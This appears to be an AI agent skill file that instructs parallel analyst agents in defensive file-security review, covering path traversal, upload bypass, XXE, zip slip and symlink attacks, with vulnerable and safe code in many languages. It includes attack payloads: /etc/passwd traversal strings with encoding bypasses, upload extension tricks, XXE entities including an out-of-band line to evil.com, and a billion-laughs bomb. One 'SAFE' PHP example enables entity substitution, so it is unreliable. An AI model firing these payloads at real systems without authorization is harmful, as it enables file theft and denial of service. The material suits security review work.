---
name: perseus-file
description: File security analysis (path traversal, upload bypass, XXE, zip slip)
---

# Perseus File Security Specialist

## Context & Authorization

**IMPORTANT:** This skill performs file security analysis on the **user's own codebase**. This is defensive security testing to find file handling vulnerabilities.

**Authorization:** The user owns this codebase and has explicitly requested this specialized analysis.

---

## Multi-Language Support

| Language | File Libraries |
|----------|---------------|
| JavaScript/TypeScript | fs, multer, formidable, busboy, path |
| Go | os, io, path/filepath, archive/zip |
| PHP | move_uploaded_file, file_get_contents, ZipArchive |
| Python | os, pathlib, shutil, zipfile, tarfile |
| Rust | std::fs, std::path, zip, tar |
| Java | java.io, java.nio, java.util.zip |
| Ruby | File, FileUtils, Zip |
| C# | System.IO, System.IO.Compression |

---

## Overview

This specialist skill performs comprehensive file security analysis including path traversal, file upload vulnerabilities, XML external entities (XXE), and archive extraction attacks.

**When to Use:** After `/scan` identifies file upload endpoints, file operations, or XML processing.

**Goal:** Find all file-related vulnerabilities that could lead to arbitrary file read/write or code execution.

## Engagement Mode Compatibility

| Mode | Specialist Behavior |
|------|---------------------|
| `PRODUCTION_SAFE` | Static flow analysis and minimal non-disruptive validation |
| `STAGING_ACTIVE` | Controlled upload/path validation with throttling |
| `LAB_FULL` | Expanded dynamic verification of file attack paths |
| `LAB_RED_TEAM` | Chain simulation against isolated storage and synthetic files only |

## Safety Gates (Required)

1. Read `deliverables/engagement_profile.md` before active file-path/upload tests.
2. Default to `PRODUCTION_SAFE` if mode is absent.
3. Enforce kill-switch thresholds and stop on instability.
4. Never overwrite, delete, or alter real production data during verification.

## File Security Risks Covered

| Risk | Description | Impact |
|------|-------------|--------|
| Path Traversal | Accessing files outside intended directory | Data theft, config exposure |
| File Upload Bypass | Uploading malicious files | Code execution |
| XXE | XML external entity injection | SSRF, file read, DoS |
| Zip Slip | Archive extraction path traversal | Arbitrary file write |
| Symlink Attacks | Following symbolic links | File access bypass |
| SSRF via File | File:// protocol abuse | Internal network access |

## Execution Instructions

### Step 0: Mode & Scope Alignment

- Load mode/scope/limits from `deliverables/engagement_profile.md`.
- Respect `deliverables/verification_scope.md` when present.
- In production mode, prefer code-level evidence and minimal safe probes.

### Phase 1: Path Traversal Analysis (4 Parallel Agents)

1.  **Path Traversal Read Analyst:**
    *   "Find file read operations with user input in path."

    **Language-Specific Patterns:**
    ```javascript
    // Node.js - VULNERABLE
    const filePath = req.query.file;
    fs.readFile(filePath, callback);
    fs.readFileSync(`./uploads/${filename}`);  // filename = "../../../etc/passwd"

    // Node.js - SAFE
    const safePath = path.join(__dirname, 'uploads', path.basename(filename));
    if (!safePath.startsWith(path.join(__dirname, 'uploads'))) {
      throw new Error('Invalid path');
    }
    ```
    ```go
    // Go - VULNERABLE
    filename := r.URL.Query().Get("file")
    data, _ := os.ReadFile(filename)

    // Go - SAFE
    filename := filepath.Base(r.URL.Query().Get("file"))
    safePath := filepath.Join(uploadDir, filename)
    if !strings.HasPrefix(safePath, uploadDir) {
        return errors.New("invalid path")
    }
    ```
    ```python
    # Python - VULNERABLE
    filename = request.args.get('file')
    with open(f"uploads/{filename}") as f:
        return f.read()

    # Python - SAFE
    from pathlib import Path
    base = Path("uploads").resolve()
    requested = (base / filename).resolve()
    if not str(requested).startswith(str(base)):
        raise ValueError("Invalid path")
    ```
    ```php
    // PHP - VULNERABLE
    $file = $_GET['file'];
    readfile("uploads/" . $file);

    // PHP - SAFE
    $file = basename($_GET['file']);
    $path = realpath("uploads/" . $file);
    if (strpos($path, realpath("uploads/")) !== 0) {
        die("Invalid path");
    }
    ```
    ```rust
    // Rust - VULNERABLE
    let path = format!("uploads/{}", user_input);
    std::fs::read_to_string(&path)?;

    // Rust - SAFE
    let base = std::path::Path::new("uploads").canonicalize()?;
    let requested = base.join(&user_input).canonicalize()?;
    if !requested.starts_with(&base) {
        return Err("Invalid path");
    }
    ```
    ```java
    // Java - VULNERABLE
    String filename = request.getParameter("file");
    Files.readAllBytes(Paths.get("uploads", filename));

    // Java - SAFE
    Path base = Paths.get("uploads").toAbsolutePath().normalize();
    Path requested = base.resolve(filename).normalize();
    if (!requested.startsWith(base)) {
        throw new SecurityException("Invalid path");
    }
    ```

2.  **Path Traversal Write Analyst:**
    *   "Find file write operations with user input in path."

    **Patterns:**
    ```javascript
    // VULNERABLE - Write to user-controlled path
    fs.writeFileSync(`./data/${req.body.filename}`, content);
    // Attack: filename = "../../../.bashrc"
    ```

3.  **Path Traversal Delete Analyst:**
    *   "Find file delete operations with user input."

    **Patterns:**
    ```javascript
    // VULNERABLE
    fs.unlinkSync(`./uploads/${req.params.file}`);
    // Attack: file = "../../../important.db"
    ```

4.  **Path Normalization Analyst:**
    *   "Check for path normalization bypasses."

    **Bypass Patterns:**
    ```
    ../../../etc/passwd
    ..%2f..%2f..%2fetc/passwd
    ..%252f..%252f..%252fetc/passwd (double encoding)
    ....//....//....//etc/passwd
    ..\/..\/..\/etc/passwd (Windows)
    ..%5c..%5c..%5cetc/passwd (Windows encoded)
    ```

### Phase 2: File Upload Analysis (5 Parallel Agents)

1.  **Extension Validation Analyst:**
    *   "Check file extension validation."

    **Bypass Patterns:**
    | Bypass | Description |
    |--------|-------------|
    | file.php.jpg | Double extension |
    | file.pHp | Case variation |
    | file.php%00.jpg | Null byte (old) |
    | file.php;.jpg | Semicolon (IIS) |
    | file.php::$DATA | NTFS stream |
    | file.jpg.php | Extension order |

    **Vulnerable Code:**
    ```javascript
    // VULNERABLE - Blacklist
    if (!filename.endsWith('.exe')) {
      // .php, .jsp, .aspx not blocked!
    }

    // VULNERABLE - Only checks first extension
    const ext = path.extname(filename);  // Returns .jpg for file.php.jpg

    // SAFE - Whitelist + full check
    const allowedExtensions = ['.jpg', '.png', '.gif'];
    const ext = path.extname(filename).toLowerCase();
    if (!allowedExtensions.includes(ext)) {
      throw new Error('Invalid extension');
    }
    ```

2.  **MIME Type Validation Analyst:**
    *   "Check content type validation."

    **Bypass Patterns:**
    - Modifying Content-Type header
    - Polyglot files (valid image + PHP)
    - Magic byte manipulation

    **Vulnerable Code:**
    ```javascript
    // VULNERABLE - Trust Content-Type header
    if (req.file.mimetype.startsWith('image/')) {
      // Attacker sets: Content-Type: image/png
    }

    // SAFE - Check actual file content (magic bytes)
    const FileType = require('file-type');
    const type = await FileType.fromBuffer(buffer);
    if (!type || !['image/jpeg', 'image/png'].includes(type.mime)) {
      throw new Error('Invalid file type');
    }
    ```

3.  **Upload Location Analyst:**
    *   "Check where files are stored and if executable."

    **Issues:**
    - Uploading to web root
    - Uploading to directory with execute permissions
    - Predictable filenames
    - No access control on uploaded files

4.  **File Size Analyst:**
    *   "Check file size limits."

    **Issues:**
    - No size limit (DoS)
    - Client-side only limit
    - Size checked after full upload

5.  **Filename Sanitization Analyst:**
    *   "Check filename handling."

    **Issues:**
    ```javascript
    // VULNERABLE - Using original filename
    const dest = `uploads/${req.file.originalname}`;

    // SAFE - Generate random filename
    const dest = `uploads/${crypto.randomUUID()}${ext}`;
    ```

### Phase 3: XXE Analysis (3 Parallel Agents)

1.  **XML Parser Configuration Analyst:**
    *   "Find XML parsing with unsafe configuration."

    **Language-Specific Patterns:**
    ```javascript
    // Node.js/libxmljs - VULNERABLE
    libxmljs.parseXml(xml, { noent: true });

    // Node.js - SAFE
    libxmljs.parseXml(xml, { noent: false, nonet: true });
    ```
    ```python
    # Python/lxml - VULNERABLE
    etree.parse(source)
    etree.fromstring(xml_string)

    # Python - SAFE
    parser = etree.XMLParser(resolve_entities=False, no_network=True)
    etree.parse(source, parser)
    ```
    ```java
    // Java - VULNERABLE
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    db.parse(inputStream);

    // Java - SAFE
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    ```
    ```php
    // PHP - VULNERABLE
    $doc = new DOMDocument();
    $doc->loadXML($xml);

    // PHP - SAFE
    libxml_disable_entity_loader(true);  // PHP < 8.0
    $doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
    ```
    ```go
    // Go - xml.Decoder is safe by default (no entity expansion)
    // But check for custom entity handling
    ```

2.  **XXE Payload Analyst:**
    *   "Check for XXE attack vectors."

    **Payloads:**
    ```xml
    <!-- File Read -->
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <data>&xxe;</data>

    <!-- SSRF -->
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]>

    <!-- Blind XXE (OOB) -->
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>
    ```

3.  **XML Bomb Analyst:**
    *   "Check for billion laughs / XML bomb protection."

    **Attack:**
    ```xml
    <!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
      <!-- ... exponential expansion ... -->
    ]>
    <data>&lol9;</data>
    ```

### Phase 4: Archive Extraction Analysis (3 Parallel Agents)

1.  **Zip Slip Analyst:**
    *   "Find archive extraction with path traversal."

    **Language-Specific Patterns:**
    ```javascript
    // Node.js/adm-zip - VULNERABLE
    zip.extractAllTo(destPath, true);
    // Entry: ../../malicious.js

    // Node.js - SAFE
    for (const entry of zip.getEntries()) {
      const destPath = path.join(dest, entry.entryName);
      if (!destPath.startsWith(path.resolve(dest))) {
        throw new Error('Zip slip detected');
      }
    }
    ```
    ```python
    # Python - VULNERABLE
    import zipfile
    with zipfile.ZipFile(file) as z:
        z.extractall(dest)  # No path check!

    # Python - SAFE
    for name in z.namelist():
        dest_path = os.path.join(dest, name)
        if not os.path.abspath(dest_path).startswith(os.path.abspath(dest)):
            raise ValueError("Zip slip detected")
    ```
    ```go
    // Go - VULNERABLE
    for _, f := range r.File {
        destPath := filepath.Join(dest, f.Name)
        // No validation!
    }

    // Go - SAFE
    destPath := filepath.Join(dest, f.Name)
    if !strings.HasPrefix(destPath, filepath.Clean(dest)+string(os.PathSeparator)) {
        return errors.New("zip slip detected")
    }
    ```
    ```java
    // Java - VULNERABLE
    ZipEntry entry = zis.getNextEntry();
    File file = new File(destDir, entry.getName());

    // Java - SAFE
    File destFile = new File(destDir, entry.getName());
    String destPath = destFile.getCanonicalPath();
    if (!destPath.startsWith(destDir.getCanonicalPath())) {
        throw new SecurityException("Zip slip detected");
    }
    ```

2.  **Tar Extraction Analyst:**
    *   "Check tar extraction for similar issues."

    **Issues:**
    - Path traversal in tar entries
    - Symlink attacks in tar
    - Device files in tar (Unix)

3.  **Symlink Attack Analyst:**
    *   "Check for symlink following in archive extraction."

    **Attack:**
    ```
    tar contains:
    1. symlink: uploads -> /etc
    2. file: uploads/passwd (overwritten!)
    ```

### Phase 5: File Protocol SSRF (2 Parallel Agents)

1.  **File URL Analyst:**
    *   "Check for file:// protocol in URL handlers."

    **Patterns:**
    ```javascript
    // VULNERABLE - Accepts file://
    const response = await fetch(userUrl);
    // Attack: file:///etc/passwd

    // SAFE - Protocol validation
    const url = new URL(userUrl);
    if (!['http:', 'https:'].includes(url.protocol)) {
      throw new Error('Invalid protocol');
    }
    ```

2.  **Local File Inclusion Analyst:**
    *   "Check for local file inclusion via various methods."

## Safe Payload Reference

| Attack | Safe Test Payload | Verification |
|--------|-------------------|--------------|
| Path Traversal | `../../../etc/passwd` | File contents returned |
| XXE | See XXE payloads above | Entity expanded |
| Zip Slip | Archive with `../../test.txt` | File written outside dest |
| Upload Bypass | `file.php.jpg` | Executed as PHP |

## Output Requirements

Create `deliverables/file_security_analysis.md`:

```markdown
# File Security Analysis

## Summary
| Category | Instances Found | Vulnerable | Safe |
|----------|-----------------|------------|------|
| Path Traversal | X | Y | Z |
| File Upload | X | Y | Z |
| XXE | X | Y | Z |
| Zip Slip | X | Y | Z |
| SSRF (file://) | X | Y | Z |

## Language/Framework Detected
- Primary: [e.g., Node.js/Express, Go, Python/FastAPI]
- File Libraries: [e.g., multer, formidable]

## Critical Findings

### [FILE-001] Path Traversal in File Download
**Severity:** Critical
**Language:** Node.js
**Location:** `routes/files.js:34`

**Vulnerable Code:**
```javascript
app.get('/download', (req, res) => {
  const file = req.query.file;
  res.sendFile(`./uploads/${file}`);
});
```

**Attack:**
```
GET /download?file=../../../etc/passwd
```

**Remediation:**
```javascript
const safeName = path.basename(req.query.file);
const safePath = path.join(__dirname, 'uploads', safeName);
if (!safePath.startsWith(path.join(__dirname, 'uploads'))) {
  return res.status(400).send('Invalid path');
}
res.sendFile(safePath);
```

---

### [FILE-002] Unrestricted File Upload
**Severity:** Critical
**Location:** `controllers/upload.js:12`

---

### [FILE-003] XXE in XML Parser
**Severity:** High
**Language:** Python
**Location:** `utils/xml_parser.py:8`

---

## File Upload Security Checklist

| Check | Status | Issue |
|-------|--------|-------|
| Extension Whitelist | FAIL | Blacklist used |
| Content Type Validation | FAIL | Trusts header |
| Magic Byte Check | FAIL | Not implemented |
| Size Limit | PASS | 10MB limit |
| Filename Sanitization | FAIL | Uses original name |
| Storage Location | WARN | In web root |

## Path Handling Audit

| Operation | Input Validated | Path Normalized | Safe |
|-----------|----------------|-----------------|------|
| readFile | No | No | VULNERABLE |
| writeFile | No | No | VULNERABLE |
| unlink | Yes | Yes | OK |

## Recommendations
1. Use path.basename() or equivalent for all user-provided filenames
2. Validate resolved paths are within expected directory
3. Implement file type validation using magic bytes
4. Store uploads outside web root
5. Disable XML external entity processing
6. Validate archive entries before extraction
```

**Next Step:** File vulnerabilities should be verified with actual payload testing.
